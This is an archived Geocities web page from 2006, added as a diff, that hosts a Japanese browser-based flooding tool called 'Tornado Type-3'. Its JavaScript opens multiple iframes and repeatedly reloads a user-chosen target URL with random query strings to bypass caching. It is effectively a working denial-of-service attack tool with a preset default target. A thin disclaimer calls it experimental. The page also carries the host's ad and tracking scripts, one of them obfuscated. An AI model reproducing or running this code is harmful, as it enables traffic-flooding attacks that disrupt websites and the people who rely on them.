@@ -1,0 +1,192 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- saved from url=(0050)https://www.geocities.ws/coq509/torunedo3_kou.html -->
+<html><!-- ARCHIVE by GEOCITIES.WS --><head><meta http-equiv="Content-Type" content="text/html; charset=Shift_JIS">
+
+<meta http-equiv="content-style-type" content="text/css">
+<title>トルネード三式</title>
+<script language="JavaScript">
+<!--
+
+	var m_toDoing;
+	var m_stBomburl;
+	var m_inInterval = 0;
+	var m_inCount = 0;
+	var m_ifFrame = new Array();
+
+	function main()
+	{
+		m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+
+		for(i = 0; i < m_ifFrame.length; i++)
+		{
+			try
+			{
+				document.all.m_dvMado.removeChild(m_ifFrame[i]);
+			}
+			catch(e){}
+		}
+
+		if(m_stBomburl[i] == "")
+		{
+			//空
+		}
+		else if((m_stBomburl.match(/co\.jp/)) ||
+			(m_stBomburl.match(/or\.jp/)) ||
+			(m_stBomburl.match(/gr\.jp/)) ||
+			(m_stBomburl.match(/go\.jp/)) ||
+			(m_stBomburl.match(/lg\.jp/)) ||
+			(m_stBomburl.match(/ac\.jp/)) ||
+			(m_stBomburl.match(/ed\.jp/)) ||
+			(m_stBomburl.match(/ad\.jp/)) ||
+			(m_stBomburl.match(/\.org/)) ||
+			(m_stBomburl.match(/2ch\.net/)) ||
+			(m_stBomburl.match(/xrea\.com/)) ||
+			(m_stBomburl.match(/gov\.jp/)) ||
+			(m_stBomburl.match(/lb\.jp/)))
+		{
+			alert("URLが不正です\n" + m_stBomburl);
+		}
+		else if(m_inInterval < 200)
+		{
+			alert("更新間隔が短すぎます。");
+		}
+		else
+		{
+			for(i = 0; i < m_inWinNum; i++)
+			{
+				m_ifFrame[i] = document.createElement('iframe');
+				m_ifFrame[i].setAttribute("id", "frame" + i);
+				m_ifFrame[i].setAttribute("height", "120");
+				m_ifFrame[i].setAttribute("width", "640");
+				document.all.m_dvMado.appendChild(m_ifFrame[i]);
+			}
+			m_inCount = 0;
+			m_toDoing = setTimeout("goBomb()", m_inInterval);
+		}
+	}
+
+	function makeQuary()
+	{
+		var n, word, kami;
+		word = "abcdefghijklmnopqrstuvwxyz0123456789\-\=\^\~\|\\\`\@\[\{\}\]\*\:\+\;\_\?\/\>\.\<\,\!\"\#\$\%\&\'\(\)\'";
+		n = 0;
+		n = Math.floor(Math.random() * 1920);
+		kami = "\?";
+		for(i = 0; i <= n; i++)
+		{
+			kami += word.charAt(Math.floor(Math.random() * word.length));
+		}
+		return kami;
+	}
+
+	function goBomb()
+	{
+		var kami, bomb;
+		kami = "";
+
+		kami = makeQuary();
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb = m_stBomburl + kami;
+			m_ifFrame[i].setAttribute("src", bomb);
+		}
+		bombCounter();
+		m_toDoing = setTimeout("goBomb()", m_inInterval);
+	}
+
+	function stopBomb()
+	{
+		clearTimeout(m_toDoing);
+		document.all.m_taInfo.value += "\n\n";
+		document.all.m_taInfo.value += "～訪問を中止しました～";
+	}
+
+	function bombCounter()
+	{
+		var stInfoTmp;
+		m_inCount++;
+		stInfoTmp = "～訪問しています～\n";
+		stInfoTmp += "回数　：" + m_inCount + "回\n";
+		stInfoTmp += "速度　：" + m_inInterval + "ms\n";
+		stInfoTmp += "砲門数：" + m_inWinNum + "門\n";
+		stInfoTmp += m_stBomburl;
+		document.all.m_taInfo.value = stInfoTmp;
+	}
+//-->
+</script>
+
+</head>
+
+<body><center>
+<script language="javascript" type="text/javascript" src="./トルネード三式_files/show_ad.php"></script>
+</center>
+<!-- Google tag (gtag.js) -->
+<script async="" src="./トルネード三式_files/js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4KX380T5BD');
+</script>
+
+<!-- END GOOGLE -->
+
+<geoads></geoads>
+
+<!-- following code added by server. PLEASE REMOVE -->
+<!-- preceding code added by server. PLEASE REMOVE -->
+<h1>ﾈ申【トルネード三式・甲】風</h1>
+<b>2006.07.23版</b><br>
+本品は実験用のツールです。これを悪用して起こったいかなる損害にも、当方は責任を負いかねます。<br>
+<br>
+<form name="m_form1">
+【対象】<br>
+<input type="text" name="m_tbUrl" size="60" value="http://t-t-factory.com/"><br>
+<br>
+【更新間隔】（1/1000秒　2秒ごとの場合 2000に）<br>
+<input type="text" size="10" name="m_tbInterval" value="1000"><br>
+<br>
+【同時更新数】（窓数）<br>
+<input type="text" size="10" name="m_tbWinNum" value="1"><br>
+<br>
+<input type="button" value="開始" onclick="main();"><input type="button" value="中止" onclick="stopBomb();"> <br>
+<br>
+【情報】<br>
+<textarea id="m_taInfo" style="border:1px solid #000000;height:100px;width:80%;">※ここに情報が表示されます。</textarea>
+</form>
+<div id="m_dvMado">
+　
+</div>
+
+
+
+<div id="footeraddiv" name="footeraddiv">Hosted by www.Geocities.ws</div>
+<br>
+<center>
+        <div>
+<script>
+
+        atOptions = {
+                'key' : '5046d8ab865606a85a55c357926403c9',
+                'format' : 'iframe',
+                'height' : 90,
+                'width' : 728,
+                'params' : {}
+        };
+
+
+    H5jewqpdjh6y = /geocities\.ws$|geocities\.ws\/$|geocities\.ws\/index\.php|geocities\.ws\/archive|geocities\.ws\/search|geocities\.ws\/terms-of-use\.php|geocities\.ws\/terms-of-service\.php|geocities\.ws\/about\.php/i;
+        t38193jfrdsswdsq = document.URL;
+        H5jewqpdjh6yfound = t38193jfrdsswdsq.search(H5jewqpdjh6y);
+  if (H5jewqpdjh6yfound == -1) {
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://deliverbrokeneloise.com/5046d8ab865606a85a55c357926403c9/invoke.js"></scr' + 'ipt>');
+}
+</script><script type="text/javascript" src="./トルネード三式_files/invoke.js.ダウンロード"></script>
+</div></center>
+
+<script language="JavaScript" src="https://us.i1.yimg.com/us.yimg.com/i/mc/mc.js"></script><script language="JavaScript" src="https://us.js2.yimg.com/us.js.yimg.com/lib/smb/js/hosting/cp/js_source/geov2_001.js"></script><script language="javascript">geovisit();</script><noscript><img src="http://visit.geocities.yahoo.com/visit.gif?us1254517666" alt="setstats" border="0" width="1" height="1"></noscript>
+<img src="./トルネード三式_files/serv" alt="1" width="1" height="1" acxn9syji="">
+</body><!-- ARCHIVE by GEOCITIES.WS --></html>
